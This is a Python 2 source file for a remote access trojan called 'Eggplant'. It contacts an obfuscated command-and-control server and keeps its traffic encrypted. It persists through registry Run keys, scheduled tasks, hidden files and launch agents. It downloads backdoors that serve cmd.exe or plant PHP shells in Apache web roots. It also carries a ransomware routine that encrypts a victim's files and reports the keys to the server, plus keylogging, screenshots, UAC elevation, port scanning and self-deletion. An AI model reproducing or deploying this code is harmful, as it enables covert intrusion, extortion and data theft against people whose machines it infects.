#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, sys, socket, subprocess
import pip.commands.install as pip
from imp import new_module
from base64 import b64encode, b64decode
from binascii import hexlify, unhexlify
from time import sleep
from requests import get, post
from uuid import uuid1
from warnings import filterwarnings

"""Cryptography Packages"""
try:
    from Crypto.Cipher import AES
    from Crypto.Hash import HMAC, SHA256
    from Crypto.Util.number import bytes_to_long, long_to_bytes
except Exception as e:
    print str(e)

"""Windows Packages"""
try:
    if os.name is 'nt':
        from _winreg import HKEY_CURRENT_USER, KEY_WRITE, KEY_ALL_ACCESS, REG_SZ, CloseKey, DeleteValue, OpenKey, SetValueEx
        from ctypes import windll
        from win32com.shell.shell import ShellExecuteEx
except Exception as e:
    print str(e)

class Eggplant(object):
    """Mother of all Eggplants. Capable of birthing entire generations of eggplants"""
    def __init__(self, *args, **kwargs):
        self.debug          = bool(kwargs.get('debug')) if 'debug' in kwargs else filterwarnings('ignore')
        self.connect_port   = int(kwargs.get('connect_port')) if kwargs.get('connect_port') else 1337
        self.logger_port    = int(kwargs.get('logger_port')) if kwargs.get('logger_port') else 9020
        self.listen_port    = int(kwargs.get('listen_port')) if kwargs.get('listener_port') else 7331
        self.backdoor_port  = int(kwargs.get('backdoor_port')) if kwargs.get('backdoor_port') else 2090
        self.sessions       = int(kwargs.get('sessions')) if kwargs.get('sessions') else lambda:self._sessions()
        self.files          = dict(kwargs.get('files')) if kwargs.get('files') else dict({'cache':[], 'net':os.tempnam(None,'Net')})
        self.persistence    = dict(kwargs.get('persistence')) if kwargs.get('persistence') else dict({'scheduled tasks':[], 'hidden files':[], 'registry keys':[]}) if os.name is 'nt' else dict({'launch agents':[], 'hidden files':[]})
        self.server         = dict(kwargs.get('server')) if kwargs.get('server') else dict({'url': 'MTI2OGE3NDQ3MDI3MDRlYTA3MTAzYjM3M2VhMjMzODMxNWJmM2FiMGMyM2Y4MDEyMjRjODBmYmVlZmY2NzFlNTQyNzc0NTgwNDZlMGE4MTkwYWIyY2EyY2ZlMzQ1ZWFlNjczMzE2OTcyN2M1YjZkZjZjYTIwNjIwZTYzYjgyNTcyNDg0YjM5ZTI3NjIxZGI3N2QyZDMyNGVjMTk4ZDYxZmYyYTMzNmU2NDU4NzBmY2I4ZTU2ZmRiNDY1YzA5MDcyMmYxYTI3NDYyMDQzNzhjMmQ1NDNmZjRjNWRkODEyYjE2ZTMyZmZiYzc3N2ZhNTYzMzY1NjdkYjcyYjk1ZGZiMWQ3ODc2NDQyMjY2Y2E3MzYwODY2ZTZiODc1MjdlZjk0ZGI4Y2IyZjY5NGQ2YTgzNDljNzIwOTlmNTY5ZWZjMDllOTkzNDMyZjRiNzZlNjc3YTkyZjAyNDgxZjM3YjMyYTY3ZmYwYzk0M2VjYWE3MjVmNTI3MGY5MWE5NDYzYjY5NTI0Y2Y3ZDBlZjViYTAwNzE3OWIyNjQyODY4NTdhYzVmZjUzZTQ3YThjMzdlZGYzYWZjNzU0NDVmOWYzNDAwNzQ1NDhjZDAyNTU1YWU0NzIwMjE0ODM5MzhlY2EzMzQ5N2VlNzBjNDRlYmI0OTM1NzM4NjMxOTVkY2Q0OTUzNTg0Nzg4ZTU5NWMxODMyZWRjZGFjNTNmOTA2OTVlYzE1MjA2MzMzMDc2YjEzMzQzOTMwNDIzNjY1MTIwNjMxNTg3NzdjNDdiMjZhM2UzZDRjNzUxOWNhYjEzMDFkYjljYzM3YzQ1OTcxZjM=', 'api': 'ODY0MTY1YTBlMTg0MzlhYmIyN2Q4NGE0YjM3MWNiZDZlYmFmNDUzOTE3Mjk3NTA=', 'key': 'ODE0OTc0YzRkNDI1ZTVlYTA0YTM1YzkzMDY5OTE2NDRiMWYwODk2OTYzYzZmYTg1ODEyNGMxMGRiMDc0MzU2NjE2MDQ4NjI3ZTRhNWMzZGRkNTI1Y2ZlNTYzNmEyZDAzMTU3NzcwMDVhMmQ3NTRlNTZhOTkyMGRkOWZjOWIyMDQ3ZGRkMGIwMGM0ZWU5NWVlOGM0ODY0ZDk3ZWIwODQ2ODA4MDQ3ZmQzZTAzMzE2ZDJmMzU1NTRjMjMyY2EyNTQ1NDNmOTYzZDc1ZTBhZDA2ZGU4MTMzNzY2MTdlNzZhNzQwYmE1ZDEwMDA1YmQ5YmQ2YTMwYWEwZWJiNWM3MTI0NjI0NWJlZTI5N2ZlNGMzODJjYWU5ZjQxYmJmMjVjNmRiMWNhY2IyYmVhNTJhNmY4YWI3MzQxZDcyMjUyOTM2ZTg5M2UyNmE5NzQ1OTQ4YmYzMzk1YTg2YTRlMTczMTM3ODk1OGY0ODkxMWUxYzc0OQ=='})
        self.open_ports     = dict(kwargs.get('port_scans')) if kwargs.get('port_scans') else dict({})
        self.backdoors      = dict(kwargs.get('backdoors')) if kwargs.get('backdoors') else dict({})
        self.local_network  = dict(kwargs.get('local_network')) if kwargs.get('local_network') else dict({})
        self.crontab        = dict({'Crontab':'/etc/cron.d', 'User Crontab':'/var/spool/cron'}) if (sys.platform.startswith('linux') or sys.platform.endswith('nix')) else None
        self.fname          = bytes(sys.argv[0][:sys.argv[0].rfind('.')])
        self.ip             = bytes(get('http://api.ipify.org').text.encode())
        self.localhost      = bytes(socket.gethostbyname(socket.gethostname()))
        self.login          = bytes(os.environ.get("USERNAME", failobj="Unknown"))
        self.machine        = bytes(os.environ.get("COMPUTERNAME", failobj="Unknown"))
        self.platform       = bytes(sys.platform) if 'darwin' not in sys.platform else 'Mac OS X'
        self.cwd            = bytes(kwargs.get('cwd')) if kwargs.get('cwd') else bytes(os.getcwd())
        self.mac            = bytes('-'.join(uuid1().hex[20:][i:i+2] for i in range(0,11,2)).upper())
        self.pstring        = bytes('ping -n 1 -w 90 {}') if os.name is 'nt' else bytes('ping -c 1 -w 90 {}')
        self.device         = bytes(os.popen('uname -a').read()) if not os.name is 'nt' else bytes('Microsoft Windows {}'.format(' '.join([i.partition(':')[2].strip() for i in os.popen('GPRESULT /R').read().splitlines() if 'OS Version' in i or 'Domain' in i])))
        self.links          = ['linux_payload.txt', 'osx_payload.sh', 'windows_payload.exe', 'icon.icns', 'icon.png', 'icon.ico', 'Info.plist', 'keylogger.py', 'screenshot.py', 'osx_make_app.py']
        self.socket         = self._connect() if 'socket' not in kwargs else kwargs.get('socket')
        self.dhkey          = self._diffiehellman() if 'dhkey' not in kwargs else kwargs.get('dhkey')
        self.url            = lambda f:'http://%s/%s' % (self.socket.getpeername()[0], f)
        self.admin          = lambda:bool(windll.shell32.IsUserAnAdmin() == 0) if os.name is 'nt' else bool(os.getuid() == 0)
        self.identity       = lambda:"\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Sessions',self.sessions()), ('Platform',self.platform), ('IP',self.ip), ('Machine',self.machine), ('Login',self.login), ('Admin',self.admin), ('Files',self.files)] if i[1]])
        self.register       = lambda:dict({'uid':self.mac, 'sessions':self.sessions(), 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'registry_keys':self.persistence.get('registry keys'), 'scheduled_tasks':self.persistence.get('scheduled tasks')}) if os.name is 'nt' else lambda:dict({'uid':self.mac, 'sessions':self.sessions(), 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'launch_agents':self.persistence.get('launch agents')})
        self.port_scan      = lambda host:filter(self.scan, [(host,port) for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389]])
        self.commands       = { 'cat'           :   self.cat,
                                'ls'            :   self.ls,
                                'pwd'           :   self.pwd,
                                'uac'           :   self.uac,
                                'scan'          :   self.scan,
                                'wget'          :   self.wget,
                                'kill'          :   self.kill,
                                'admin'         :   self.admin,
                                'unzip'         :   self.unzip,
                                'update'        :   self.update,
                                'ransom'        :   self.ransom,
                                'lan'           :   self.network,
                                'info'          :   self.identity,
                                'backdoor'      :   self.backdoor,
                                'selfdestruct'  :   self.destruct,
				'portscan'	:   self.port_scan,
                                'keylogger'     :   self.keylogger,
                                'screenshot'    :   self.screenshot,
                                'mac'           :   self.mac_address,
                                'encrypt'       :   self.encrypt_file,
                                'decrypt'       :   self.decrypt_file,
                                'register'      :   self.register_client,
                                'persistence'   :   self.client_persistence
                                }


    def _services(self):
        """Initialize a dictionary of port numbers and their associated protocols/services as the key/value pairs"""
        return dict({i.split()[1].split('/')[0]:[i.split()[0], ' '.join(i.split()[2:])] for i in get(self.urls.get('services')).text.encode().splitlines() if len(i.split()) if 'tcp' in i.split()[1]})

    def _sessions(self):
        """Session tracker"""
        self.files.update({'session':os.environ.get('TEMP', failobj=os.getcwd()) + os.sep + '.' + self.mac + '.txt'})
        if os.path.isfile(self.files.get('session')):
            with open(self.files.get('session'), 'r') as fs:
                prev = int(fs.read())
            current = prev + 1
        else:
            current = 1

        with file(self.files.get('session'), 'w') as fp:
            fp.write(str(current))

        return str(current)

    def _send(self, data, method='default'):
        """Encrypt and send data to server"""
        try:
            block = data[:4096]
            data  = data[len(block):]
            ciphertext  = self._encrypt(block)
            msg = '{}:{}\n'.format(method, ciphertext)
            self.socket.sendall(msg)
            if len(data):
                return self._send(data, method)
        except Exception as e:
            if self.debug:
                print "Send data returned error: {}".format(str(e))

    def _identity(self):
        """Helper function for enumerating host machine information"""
        return self.identity()

    def _pad(self, data):
        """Pad data for AES encryption"""
        return data + b'\0' * (AES.block_size - len(data) % AES.block_size)

    def _choice(self, iterable):
        """Randomly select an element from an iterable (pseudo-random)"""
        if hasattr(iterable, '__iter__'):
            return iterable[int([n for n in [ord(os.urandom(1)) for i in xrange(1000)] if n < len(iterable)][0])]

    def _connect(self):
        """Connects to server"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(True)
        try:
            info = get(self._deobfuscate(self.server.get('url')), headers={self._deobfuscate(self.server.get('api')) : self._deobfuscate(self.server.get('key'))}).json()
            addr = (info.get(info.keys()[0])[0].get('ip').encode(), self.connect_port)
            s.connect(addr)
            self.socket = s
            return s
        except Exception as e:
            if self.debug:
                print "Connection error: {}".format(str(e))
            sleep(10)
            execfile(sys.argv[0])
            sys.exit(0)
    
    def _ping(self, host, *args):
        """Pings a machine in the local network"""
        try:
            if subprocess.call(self.pstring.format(host), shell=True) == 0:
                return host
        except: pass

    def _diffiehellman(self, bits=2048):
        """Diffie-Hellman key agreement"""
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = bytes_to_long(os.urandom(32)) 
            xA = pow(g, a, p)
            self.socket.send(long_to_bytes(xA))
            xB = bytes_to_long(self.socket.recv(256))
            x = pow(xB, a, p)
            return SHA256.new(long_to_bytes(x)).digest()
        except Exception as e:
            if self.debug:
                print "Diffie-Hellman error: {}".format(str(e))
            sleep(10)
            execfile(sys.argv[0])
            sys.exit(0)

    def _encrypt(self, plaintext):
        """AES 128-bit encryption """
        try:
            text = self._pad(plaintext)
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            ciphertext = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
            output = b64encode(ciphertext + hmac_sha256)
            if self.debug:
                print output
            return output
        except Exception as e:
            if self.debug:
                print "Encryption error: {}".format(str(e))

    def _decrypt(self, ciphertext):
        """Decrypt data encrypted with session key"""
        try:
            ciphertext  = b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            check_hmac  = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            if self.debug:
                print output.rstrip(b'\0')
                if check_hmac != calc_hmac:
                    print str("Sent HMAC-SHA256 Hash: {}".format(hexlify(check_hmac)) + "\nCalc HMAC-SHA256 Hash: {}".format(hexlify(calc_hmac)))
            return output.rstrip(b'\0')
        except Exception as e:
            if self.debug:
                print "Decryption error: {}".format(str(e))

    def _deobfuscate(self, block):
        """Deobfuscate any obfuscated data, code, text, or files."""
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return unhexlify(str().join(block[n] for n in p)) 

    def _persistence(self, **kwargs):
        """Establishes persistence on client host machine"""
        if os.name is 'nt':
            try:
                fpath = sys.argv[0]
                interval = 'hourly'
                try:
                    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                    key_val = sys.argv[0]
                    key_id  = self.fname
                    reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                    SetValueEx(reg_key, key_id, 0, REG_SZ, key_val)
                    CloseKey(reg_key)
                    self.persistence.get('registry keys').append(key_id)
                except: pass
                try:
                    direct = os.popen('attrib +h {}'.format(sys.argv[0])).read()
                    self.persistence.get('hidden files').append(sys.argv[0])
                except: pass
                try:
                    schtask = subprocess.Popen('schtasks /create /tn {} /tr {} /sc {} /f'.format(self.fname, sys.argv[0], interval), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
                    out,err = schtask.communicate()
                    self.persistence.get('scheduled tasks').append(self.fname)
                except: pass
            except Exception as w:
                if self.debug:
                    print "Persistence error: {}".format(str(w))
            result = "\n\n" + "\n\n".join(["{} : {}".format(str(i).title(), str(self.persistence.get(i))) for i in self.persistence.keys()]) + "\n\n"

        elif sys.platform in ('darwin','ios'):
            try:
                filename = os.path.basename(sys.argv[0])
                if not filename.startswith('.'):
                    hidden = '.' + filename
                    os.rename(sys.argv[0], hidden)
                    self.persistence.get('hidden files').append(hidden)
            except:
                pass

            try:
                osx_paths = ['var','tmp','lib','local','cache']
                osx_files = ['.local','.cache','.fsevents','.V100_Spotlight','.bash_profile']
                fpath = os.path.join(self._choice(osx_paths), self._choice(osx_files))
                os.makedirs(fpath) if not os.path.isdir(fpath) else None
            except:
                fpath = os.path.join(os.environ.get('TEMP', failobj=os.getcwd()), self._choice(osx_files))
            try:
                plist       = get(self.urls.get('plist')).text.encode()
                label       = self._choice('updates','cache','itunes','spotlight','archives')
                infoPlist   = plist.replace('__LABEL__',label).replace('__SELF__', sys.argv[0])

                with file(fpath, 'w') as fp:
                    fp.write(infoPlist)

                self.persistence.get('hidden files').append(fpath)
                os.chmod(fpath, 0755)
                self.persistence.get('launch agents').append('~/Library/LaunchAgents/'+ label + '.plist')
                os.startfile(fpath)
            except:
                pass

            result = "\n".join(["{} : {}".format(str(i).title(), str(self.persistence.get(i))) for i in self.persistence.iterkeys()])
        else:
            result = "\nPersistence not yet available for " + self.platform + "\n"

        return result

    def _backdoor(self, **kwargs):
        """Drops a backdoor on client host machine"""
        if sys.platform in ('darwin','ios'):
            if 'osx_make_app' not in globals():
                osx_app_file = self.wget(self.urls.get('osx_make_app').format(self.socket.getpeername()[0]))
                with open(osx_app_file, 'r') as fp:
                    osx_app  = fp.read()
                osx_make_app = create_module(osx_app, 'osx_make_app')
            try:
                appname      = os.path.splitext(os.path.basename(sys.argv[0]))[0]
                iconfile     = self.wget(self.urls.get('icon_icns'), path=icon_path)
                payload_file = self.wget(self.urls.get('osx_backdoor'))
                with file(payload_file, 'r') as fr:
                    payload = fr.read()
                osx_payload  = payload.replace('__HOST__', self.ip).replace('__PORT__', self.backdoor_port).replace('__APPNAME__',appname)
                try:
                    app_bundle = globals()['osx_make_app'].main(osx_payload, icon=iconfile, version='27.0.0.170')
                except Exception as u:
                    if self.debug:
                        print "Mac OS X make app bundle error: {}".format(str(u))
                os.chmod(payload_path, 0755)
                self.backdoors.update({'app':str(os.getcwd() + os.sep + appname + '.app'), 'launch agent':str('~/Library/LaunchAgents/com.apple.'+appname)})
                return '\nBackdoor app:\t{}\nLaunch agent:\t{}\n'.format(str(os.getcwd() + os.sep + appname + '.app'), str('~Library/LaunchAgents/com.apple.' + appname))
            except Exception as y:
                if self.debug:
                    print "Mac OS X backdoor error: {}".format(str(y))

        elif os.name is 'nt':
            try:
                bd = self.wget(self.urls.get('windows_payload').format(self.socket.getpeername()), path='MicrosoftUpdateManager')
                _ = os.popen('attrib +h {}'.format(os.path.abspath(bd))).read()
                self.persistence.get('hidden files').append(bd)
                if 'Error' not in bd:
                    self.backdoors.update({'sbd':bd})
                    __ = os.popen('start /b /d {} {} -l -p 4433 -c on -q -D on -e cmd.exe'.format(os.path.dirname(bd), os.path.basename(bd))).read()
                    try:
                        tn  = kwargs.get('appname') if 'appname' in kwargs else os.tempnam(None,'Adobe')
                        ___ = os.popen('schtasks /create /tn {} /tr {} /sc hourly'.format(tn, bd)).read()
                        self.persistence.get('scheduled tasks').append(tn)
                    except: pass
                    return 'Success - backdoor listening on {} at port {}'.format(str(self.ip), str(self.backdoor_port))
                else:
                    return 'Failed to download backdoor'
            except Exception as ee:
                if self.debug:
                    print 'Windows backdoor failed with error: {}'.format(str(ee))

        elif 'posix' in os.name:
            try:
                result = []
                if not self.backdoors.has_key('apache'):
                    self.backdoors.update({'apache':[]})
                if subprocess.call('service --status-all | grep apache2',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0 and os.path.isdir('/var/www/html'):
                    php = self.wget(self.urls.get('linux_payload'), path='/var/www/html/.apache.php')
                    self.backdoors.get('apache').append(path)
                    result.append("Embedded backdoor in the Apache web server root directory: '" + path + "'")
                    items = [i for i in os.listdir('/var/www/html') if os.path.isdir(i)]
                    for doc in items: 
                        np = os.path.join(os.path.abspath(doc), '.apache.php')
                        payload = self.wget(self.urls.get('linux_payload', path=np))
                        result.append("Embedded backdoor in a website document root as: " + np)
                        self.backdoors.get('apache').append(np)
                    if subprocess.call('service apache2 start',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0:
                        result.append("Apache webserver now running on client host machine...")
                    return "\n".join(result)
            except Exception as bderr:
                if self.debug:
                    print "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
                return "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))

    def _install_update(self, name, executable, version):
        """Update worker function"""
        try:
            updatePath  = os.environ.get('TEMP', failobj=os.getcwd())
            updateName  = os.path.join(updatePath, executable)
            updateUrl   = 'http://{}/{}'.format(socket.getpeername()[0], os.path.basename(sys.argv[0]))
            getUpdate   = self.wget(updateUrl)
        except Exception as ue:
            return "Update download from '{}' failed with error: {}".format(url, str(ue))

        if os.name is 'nt':
            try:
                p = subprocess.Popen('@ECHO OFF',0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                p.communicate('start /b /d ' + updatePath + ' ' + executable)
            except Exception as f:
                if self.debug:
                    return "Update failed with error: {}".format(str(f))

        elif sys.platform.starswith('darwin'):
            try:
                bundle          = name.replace(' ','')
                bundleVersion   = bundle + " " + version
                bundleIdentify  = "com.apple." + bundle
                appPath         = os.getcwd() + os.sep + bundle + '.app'
                os.makedirs(appPath + os.sep + 'Contents' + os.sep + 'MacOS')
                os.mkdir(appPath + os.sep + 'Contents' + os.sep + 'Resources')
                icon            = self.wget(self.urls.get('icon_icns'), path=str(appPath + os.sep + 'Contents' + os.sep + 'Resources' + os.sep + 'icon.icns'))
                infoPlist       = get(self.urls.get('plist')).text.encode() % (exe, bundleVersion, icon, bundleIdentify, bundle, bundleVersion, version)

                with file(str(appPath + os.sep + 'Contents' + os.sep + "PkgInfo"), "w") as fp:
                    fp.write("APPL????")

                with file(appPath + os.sep + 'Contents' + os.sep + 'Info.plist', "w") as fw:
                    fw.write(infoPlist)

                os.chmod(appPath + os.sep + 'Contents' + os.sep + 'MacOS' + os.sep + exe, 0755)

            except Exception as e:
                if self.debug:
                    print "Update error: {}".format(str(e))

    def _ransom_update(self, filename):
        """Update ransom database"""
        try:
            stmt = "INSERT INTO filesystems (ip, mac, filename, keyvalue) VALUES ('{}','{}','{}','{}')".format(self.ip, self.mac, os.path.abspath(filename), self.dhkey)
            self._send(stmt, method='query')
        except Exception as e:
            return "Ransom database update error: {}".format(str(e))

    def _ransom(self, arg, dirname, fnames):
        """Ransom worker function"""
        errors = [e for e in map(self._ransom_update, [x for x in map(self.encrypt_file, [os.path.join(dirname, i) for i in fnames]) if x]) if e]
        if errors:
            if self.debug:
                print "Warning: ransom worker returned the following error(s):\n{}".format("\n".join(errors))

    def _purge_regkeys(key_name):
        """Cleaner helper function for purging Windows registry keys created for persistence"""
        all_keys = self.persistence.get('registry keys').keys()
        for key in all_keys:
            value = self.persistence.get('registry keys').get(key).get('value')
            run_key = self.persistence.get('registry keys').get(key).get('key')
            try:
                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_ALL_ACCESS)
                DeleteValue(reg_key, value)
                CloseKey(reg_key)
            except Exception as e:
                if self.debug:
                    print "Destruct error: {}".format(str(e))

    def _unschedule_tasks(self):
        """Cleaner helper function"""
        all_tasks = self.persistence.get('scheduled tasks')
        for task in all_tasks:
            try:
                delete = subprocess.Popen(['schtasks','/delete','/tn',task,'/f'],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                output,error = delete.communicate()
                if 'SUCCESS' not in output:
                    if self.debug:
                        print "Delete scheduled task failed to remove task with name: {}".format(task[0])
            except Exception as e:
                if self.debug:
                    print "Destruct error: {}".format(str(e))

    def _remove_backdoors(self):
        """Cleaner function"""
        for bd in self.backdoors: 
            if os.path.isfile(bd):
                try:
                    os.remove(bd)
                except Exception as t:
                    if self.debug:
                        print "Remove backdoor returned error: {}".format(str(t))

            elif os.path.isdir(bd):
                if not os.name=='nt':
                    try:
                        r = subprocess.check_output(['rm','-rf',bd],shell=True)
                    except Exception as er:
                        if self.debug:
                            print "Remove backdoor returned error: {}".format(str(er))
                else:
                    try:
                        r = subprocess.Popen(['rmdir','/s','/q',bd],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                    except Exception as p:
                        if self.debug:
                            print "Remove backdoor returned error: {}".format(str(p))

    def register_client(self):
        """Register client host machine on server database"""
        return self.register()

    def mac_address(self):
        """Use the hardware id (MAC address) to uniquely identify the host machine"""
        return self.mac

    def kill(self, sock=None):
        """End client connection"""
        try:
            if not sock:
                sock = self.socket
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                sock.close()
            except:
                pass
        except Exception as e:
            if self.debug:
                print "Kill client failed with error: {}".format(str(e))
                
    def unzip(self, action):
        """Unzip compressed file"""
        global create_module
        try:
            if 'unzip' in globals():
                result = globals()['unzip'](action)
                return result
            else:
                unzip = create_module(get(self.urls['unzip']).text.encode(), 'unzip')
                result = unzip(action)
                return result
        except Exception as e:
            return "Unzip returned error: {}".format(str(e))

    def uac(self):
        """Run with administrator privileges"""
        try:
            ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(sys.argv[0]))
            sys.exit(0)
        except Exception as e:
            if self.debug:
                print "UAC error: {}".format(str(e))
            return True
    
    def scan(self, addr):
        """Port-scanner and banner-grabber"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        host = addr[0]
        port = addr[1]
        try:
            sock.connect((host,int(port)))
            try:
                banner = sock.recv(1024)
                if banner:
                    info = {str(port):{'protocol':self._services().get(str(port))[0], 'service':banner, 'state':'open'}}
                else:
                    info = {str(port):{'protocol':self._services().get(str(port))[0], 'service':self._services().get(str(port))[1], 'state':'open'}}
                if self.debug:
                    print '\nDetected Open Port: {} ({}) on host {}'.format(str(port), self._services().get(str(port))[0], str(host))
            except:
                info = {str(port):{'protocol':self._services().get(str(port))[0], 'service':self._services().get(str(port))[1], 'state':'open'}}

            if host in self.local_network:
                self.local_network.get(host).get('ports').update(info)
            else:
                self.open_ports.get(host).get('ports').update(info)
        finally:
            sock.shutdown(socket.SHUT_RDWR)

    def ransom(self, path):
        """Encrypt the selected file or all files in the selected directory"""
        if os.path.isfile(path):
            _ = self.encrypt_file(path)
        elif os.path.isdir(path):
            try:
                os.path.walk(path, self._ransom, None)
            except Exception as e:
                if self.debug:
                    print "Ransom error: {}".format(str(e))
                return "Ransom error: {}".format(str(e))
        return "Successfully encrypted '{}'".format(path)

    def client_persistence(self):
        """Display key/value pairs of persistence dictionary in readable format"""
        output = ['\n[ Persistence ]\n']
        try:
            for k in self.persistence.iterkeys():
                output.append(k.title())
                output.extend([str('\t'+i) for i in self.persistence.get(k)])
        except Exception as e:
            if self.debug:
                print 'Get Persistence error: {}'.format(str(e))
        return '\n'.join(output)

    def encrypt_file(self, filename):
        """Encrypt a file on client host machine"""
        if os.path.isfile(filename):
            try:
                with file(filename, 'r') as fp:
                    data = fp.read()
                with file(filename, 'w') as fc:
                    fc.write(self._encrypt(data))
                return filename
            except Exception as e:
                if self.debug:
                    print "File encryption returned an error: {}".format(str(e))
            
    def decrypt_file(self, filename):
        """Decrypt a file encrypted by the client on the host machine:"""
        if os.path.isfile(filename):        
            try:
                with file(filename, 'r') as fp:
                    data = fp.read()
                with file(filename, 'w') as fc:
                    fc.write(self._decrypt(data))
                return filename
            except Exception as e:
                if self.debug:
                    print "File decryption returned an error: {}".format(str(e))

    def cd(self, filepath):
        """Change directory command for reverse shells"""
        try:
            
            return 'Current directory: {}'.format(os.getcwd())
        except Exception as e:
            return 'Change directory returned error: {}'.format(str(e))
        
    def cat(self, filepath):
        """Emulates the UNIX command for Windows compatability with Windows"""
        if os.path.isfile(filepath):
            try:
                with open(filepath) as f:
                    return f.read(4000)
            except IOError:
                return 'Error: Permission denied.'
        else:
            return 'Error: File not found.'

    def run_cmd(self, cmd):
        """Run a terminal command + arguments."""
        p = subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
        _, __ = p.communicate()
        return

    def ls(self, path='.'):
        """Emulates the UNIX command for Windows compatability with Windows"""
        if os.path.exists(path):
            try:
                return '\n'.join(os.listdir(path))
            except OSError:
                return 'Error: Permission denied.'
        else:
            return 'Error: Path not found.'

    def pwd(self):
        """Emulates the UNIX command for Windows compatability with Windows"""
        return os.getcwd()

    def destruct(self):
        """Purges host machine of any trace of the client (hidden files, registry keys, backdoors, etc.)"""
        try:
            for bd in self.backdoors:
                try:
                    self._remove_backdoors()
                except Exception as z:
                    if self.debug:
                        print "Backdoor-destruct error: {}".format(str(z))
                        
            for k in self.files.keys():
                for f in self.files.get(k):
                    if os.path.isfile(f):
                        try:
                            os.remove(f)
                        except Exception as e:
                            if self.debug:
                                print "File-destruct error: {}".format(str(e))

            for h in self.persistence.get('hidden files'):
                try:
                    os.remove(h)
                except Exception as c:
                    if self.debug:
                        print "Hidden file destruct error: {}".format(str(c))

            if os.name is 'nt':
                try:
                    self._purge_regkeys()
                except Exception as v:
                    if self.debug:
                        print "Registry key destruct error: {}".format(str(v))

            if os.name is 'nt':
                try:
                    self._unschedule_tasks()
                except Exception as sc:
                    if self.debug:
                        print "Schedule tasks destruct error: {}".format(str(sc))

            if sys.platform in ('darwin','ios'):
                for agent in self.persistence.get('launch agents'):
                    try:
                        os.remove(agent)
                    except Exception as xc:
                        if self.debug:
                            print "Launch agent destruct error: {}".format(str(x))

            for i in self.files.get('cache'):
                if os.path.isfile(i):
                    try:
                        os.remove(i)
                    except Exception as t:
                        if self.debug:
                            print "Cache file destruct error: {}".format(str(t))        

                elif os.path.isdir(i):
                    if not os.name is 'nt':
                        try:
                            r = subprocess.check_output(['rm','-rf',i],shell=True)
                        except Exception as er:
                            if self.debug:
                                print "Posix directory tree directory destruct error: {}".format(str(er))
                    else:
                        try:
                            r = subprocess.Popen(['rmdir','/s','/q',i],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                        except Exception as p:
                            if self.debug:
                                print "Windows directory tree destruct error: {}".format(str(p))
                try:
                    self._kill()
                except Exception as p:
                    if self.debug:
                        print "Connection shutdown returned error: {}".format(str(p))
                try:
                    os.remove(sys.argv[0])
                except Exception as p:
                    if self.debug:
                        print "Self-destruct error: {}".format(str(p))
        finally:
            exit()

    def network(self, targets=None, mode='map'):
        """Map open ports on a network"""
        if mode == 'map':
            result = ['\t[ Network Map ]']
            if not targets:
                targets = filter(self._ping, ['.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1]) + '.' + str(i) for i in xrange(1,255)])
            for addr in targets:
                self.open_ports.update({ addr : { 'ports' : [] }})
                result.append(addr)
            return "\n\n".join(result)
        elif mode == 'scan':
            try:
                targets = self.open_ports if not targets else targets
                for host in targets:
                    if host not in self.open_ports:
                         self.port_scan(host)
                for ip in [i for i in targets if i in self.open_ports]:
                    result.append('Port scan report for {}'.format(str(ip)))
                    result.append('PORT    STATE    PROTOCOL    SERVICE')
                    for port in self.open_ports.get(ip).get('ports'):
                        port_info   = self.local_network.get(ip).get('ports').get(port)
